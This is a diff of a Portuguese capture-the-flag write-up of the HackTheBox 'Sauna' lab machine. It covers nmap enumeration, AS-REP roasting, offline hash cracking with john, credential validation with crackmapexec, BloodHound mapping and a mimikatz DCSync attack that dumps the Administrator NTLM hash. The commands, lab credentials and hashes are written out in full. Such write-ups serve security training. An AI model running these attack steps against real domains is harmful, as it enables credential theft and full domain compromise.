@@ -1,3 +1,14 @@
+1. [Resolução da máquina **Sauna**](#resolução-da-máquina-sauna) 1. [Máquina Easy (hackthebox.com)](#máquina-easy-hacktheboxcom) 2. [by **_JavaliMZ_** - 15/09/2021](#by-javalimz---15092021)
+2. [Enumeração](#enumeração)
+    1. [Nmap](#nmap)
+3. [Web Server](#web-server)
+4. [AS-REP Roasting Attack](#as-rep-roasting-attack)
+    1. [GetNPUsers.py](#getnpuserspy)
+        1. [**_Pwn3d!_**](#pwn3d)
+5. [Primeiro pé na máquina](#primeiro-pé-na-máquina)
+6. [BloodHound](#bloodhound)
+7. [Escalada de Privilégios](#escalada-de-privilégios)
+
 ![](Assets/HTB-Windows-Easy-Sauna/icon.webp)
 
 <img src="https://img.shields.io/badge/Sauna-HackTheBox-green?style=plastic" width="200">
@@ -23,6 +34,7 @@ Como sempre, para qualquer PenTest, precisamos saber qual é o alvo. E o primeir
 ```bash
 nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49675,49676,49677,49700,49720 10.10.10.175 -vvv -oN enumeration/nmap-A.txt -Pn
 ```
+
 ```txt
 # Nmap 7.91 scan initiated Wed Sep 15 21:03:01 2021 as: nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49675,49676,49677,49700,49720 -vvv -oN enumeration/nmap-A.txt -Pn 10.10.10.175
 Nmap scan report for 10.10.10.175
@@ -32,7 +44,7 @@ Scanned at 2021-09-15 21:03:02 WEST for 96s
 PORT      STATE SERVICE       REASON  VERSION
 53/tcp    open  domain        syn-ack Simple DNS Plus
 80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
-| http-methods: 
+| http-methods:
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
@@ -61,17 +73,17 @@ Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: 7h00m01s
-| p2p-conficker: 
+| p2p-conficker:
 |   Checking for Conficker.C or higher...
 |   Check 1 (port 35558/tcp): CLEAN (Timeout)
 |   Check 2 (port 54801/tcp): CLEAN (Timeout)
 |   Check 3 (port 18966/udp): CLEAN (Timeout)
 |   Check 4 (port 57297/udp): CLEAN (Timeout)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb2-security-mode: 
-|   2.02: 
+| smb2-security-mode:
+|   2.02:
 |_    Message signing enabled and required
-| smb2-time: 
+| smb2-time:
 |   date: 2021-09-16T03:04:00
 |_  start_date: N/A
 
@@ -104,7 +116,7 @@ cat users-full-name
 #>  Bowie Taylor
 #>  Sophie Driver
 
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]'
 #>  fergus smith
 #>  hugo bear
@@ -112,7 +124,7 @@ cat users-full-name | tr '[A-Z]' '[a-z]'
 #>  shaun coins
 #>  bowie taylor
 #>  sophie driver
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) $2}'
 #>  fsmith
 #>  hbear
@@ -120,7 +132,7 @@ cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) $2}'
 #>  scoins
 #>  btaylor
 #>  sdriver
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) "." $2}'
 #>  f.smith
 #>  h.bear
@@ -128,9 +140,9 @@ cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) "." $2}'
 #>  s.coins
 #>  b.taylor
 #>  s.driver
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) $2}' > users
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) "." $2}' >> users
 ```
 
@@ -142,7 +154,7 @@ Uma das tecnologias de autenticação da Microsoft Active Directory é o Kerbero
 
 Uma das primeiras etapas de autenticação Kerberos é a pré-autenticação. A pré-autenticação usa a senha do usuário para encriptar um carimbo de data / hora. O controlador de domínio (DC) irá decriptar isso para validar a senha correta e não ter uma solicitação anterior repetida. Uma vulnerabilidade pode ocorrer quando a pré-autenticação é desabilitada.
 
-Uma vez desativado,  quando um atacante solicita dados de autenticação de qualquer usuários, o DC retornará um "Ticket" de concessão de "Ticket" criptografado (TGT). Ele pode então ser crackeado por força bruta em um ambiente offline.
+Uma vez desativado, quando um atacante solicita dados de autenticação de qualquer usuários, o DC retornará um "Ticket" de concessão de "Ticket" criptografado (TGT). Ele pode então ser crackeado por força bruta em um ambiente offline.
 
 Para isso existem diversas ferramentas. Para esta máquina irei utilizar uma que, com ajuda da nossa lista de potenciais usuários, irá solicitar um TGT de cada usuário, e se o usuário existir e tiver a opção "Do not require Kerberos preauthentication", iremos receber diretamente um TGT.
 
@@ -177,6 +189,7 @@ O que é isso? **$krb5asrep$23$fsmith**... é o tal TGT do usuário fsmith! Agor
 nano fsmith_hash  # paste the hash and save...
 john --wordlist=/usr/share/wordlists/rockyou.txt fsmith_hash  # Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
 ```
+
 Já temos uma credencial. Temos de validá-lo! Para isso, o crackmapexec é muito útil!
 
 ```bash
@@ -195,26 +208,28 @@ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 #>  WINRM       10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
 #>  WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
 ```
-### ***Pwn3d!***
 
-O Crackmapexec nos diz que as credenciais estão válidas para ambos os serviços, mas no winrm informa-nos que está ***Pwn3d!***. Isto significa que podemos entrar a vontade sem ser barrado por nenhum segurança xD
+### **_Pwn3d!_**
+
+O Crackmapexec nos diz que as credenciais estão válidas para ambos os serviços, mas no winrm informa-nos que está **_Pwn3d!_**. Isto significa que podemos entrar a vontade sem ser barrado por nenhum segurança xD
 
 ![In the machine with user fsmith](Assets/HTB-Windows-Easy-Sauna/InTheMachine-user-fsmith.png)
 
 # Primeiro pé na máquina
 
 Sabemos que é um Active Directory / Domain Controller. A primeira coisa a fazer num AD/DC é enumerar todos os usuários. Existem 2 tipos de usuários. Usuários Locais, e usuários de domínio. Para enumerar os usuários locais, podemos efectuar um "net users":
+
 ```bash
 net users
-#>  
+#>
 #>  User accounts for \\
-#>  
+#>
 #>  -------------------------------------------------------------------------------
 #>  Administrator            FSmith                   Guest
 #>  HSmith                   krbtgt                   svc_loanmgr
 ```
-Adicionemos esse usuários à nossa lista...
-Não me foi possível enumerar os usuários de domínio através de "Get-DomainUser", nem com "wmic useraccount get name,sid"...
+
+Adicionemos esse usuários à nossa lista... Não me foi possível enumerar os usuários de domínio através de "Get-DomainUser", nem com "wmic useraccount get name,sid"...
 
 O segundo passo é ver se existem passwords por defeito. Esta máquina é uma simulação de uma empresa (Muito pequena certo, mas em grande escala as coisas funcionam exatamente da mesma maneira...), Portanto, existe sempre a possibilidade de os administradores decidirem adicionar uma palavra pass por defeito, para que a posterior, depois de criar um novo usuário, esse usuário altere a password para uma da sua escolha. O problema é que, se não for definido no windows para ser obrigatória a mudança de password no próximo login, os usuário podem ser preguiçoso e não alteram esta password por defeito. Até mesmo os administradores... como iremos ver neste caso...
 
@@ -253,12 +268,11 @@ crackmapexec smb 10.10.10.175 -u users -p 'Moneymakestheworldgoround!'
 #> SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
 ```
 
-BINGO! Encontrámos mais uma credential válida => **svc_loanmgr:Moneymakestheworldgoround!**
-Não esquecer de validar a credencial, em SMB e WINRM pelo crakmapexec também...
+BINGO! Encontrámos mais uma credential válida => **svc_loanmgr:Moneymakestheworldgoround!** Não esquecer de validar a credencial, em SMB e WINRM pelo crakmapexec também...
 
 ![Validação de credenciais para user svc_loanmgr](Assets/HTB-Windows-Easy-Sauna/InTheMachine-user-svc_loanmgr.png)
 
-Mesma história... Este novo usuário tem privilégios para aceder à máquina via WinRM provavelmente por ser membro de um groupo chamado ***"BUILTIN\Remote Management Users"***
+Mesma história... Este novo usuário tem privilégios para aceder à máquina via WinRM provavelmente por ser membro de um groupo chamado **_"BUILTIN\Remote Management Users"_**
 
 # BloodHound
 
@@ -269,13 +283,15 @@ sudo neo4j start
 
 bloodhound &>/dev/null &
 ```
+
 Agora que dados por nessa base de dados?!
 
-Existem também diversas ferramentas lol (como quase tudo em PenTesting), mas acho que a mais cómoda e de forma totalmente remota desde o meu Kali-Linux é com a ferramenta ***"bloodhound-python"***
+Existem também diversas ferramentas lol (como quase tudo em PenTesting), mas acho que a mais cómoda e de forma totalmente remota desde o meu Kali-Linux é com a ferramenta **_"bloodhound-python"_**
 
 ```bash
 bloodhound-python -c All -u fsmith -p 'Thestrokes23' -d egotistical-bank.local -ns 10.10.10.175 -dc egotistical-bank.local
 ```
+
 ![BloodHound-python](Assets/HTB-Windows-Easy-Sauna/BloodHound.png)
 
 Importe o resultado para o bloodhound
@@ -286,7 +302,7 @@ Importe o resultado para o bloodhound
 
 Este videograma é um mini exemplo do que se pode fazer com BloodHound. Isto representa todo o AD/DC e permite filtrar e encontrar caminhos mais facilmente...
 
-O parte final do video indica um caminho potencial, e indica também o que fazer para comprometer o domain controller! Com a credential que temos do user svc_loanmgr, temos possibilidade de nos converter no usuário de domínio que queremos. BloodHound também nos indica a ferramenta a utilizar para isso! ***MIMIKATZ*** e até o comando adequado ***lsadump::dcsync /domain:testlab.local /user:Administrator***
+O parte final do video indica um caminho potencial, e indica também o que fazer para comprometer o domain controller! Com a credential que temos do user svc*loanmgr, temos possibilidade de nos converter no usuário de domínio que queremos. BloodHound também nos indica a ferramenta a utilizar para isso! \*\*\_MIMIKATZ*** e até o comando adequado **_lsadump::dcsync /domain:testlab.local /user:Administrator_\*\*
 
 Essa vulnerabilidade existe porque o usuário svc_loanmgr tem privilégios de DS-Replication-Get-Changes-All e de DS-Replication-Get-Changes no Domínio. Esse dois privilégios em conjunto permite executar o que é chamado de DCSync attack. É parecido ao que acontece quando se tem privilégios locais de SeImpersonatePrivileges, mas em Domain Controller.
 
@@ -304,7 +320,7 @@ upload mimikatz.exe
 
 #>  ...
 #>  ** SAM ACCOUNT **
-#>  
+#>
 #>  SAM Username         : Administrator
 #>  Account Type         : 30000000 ( USER_OBJECT )
 #>  User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
@@ -312,7 +328,7 @@ upload mimikatz.exe
 #>  Password last change : 7/26/2021 9:16:16 AM
 #>  Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
 #>  Object Relative ID   : 500
-#>  
+#>
 #>  Credentials:
 #>    Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
 #>      ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
@@ -322,6 +338,7 @@ upload mimikatz.exe
 #>      lm  - 1: 7af65ae5e7103761ae828523c7713031
 #>  ...
 ```
+
 A resposta é comprida... mas pelo meio encontra-se o Hash NTML do usuário de domínio Administrator. Verificamos as credenciais, sempre com a mesma ferramenta crackmapexec
 
 ![Administrator Login](Assets/HTB-Windows-Easy-Sauna/PrivEsc-Administrator-login.png)
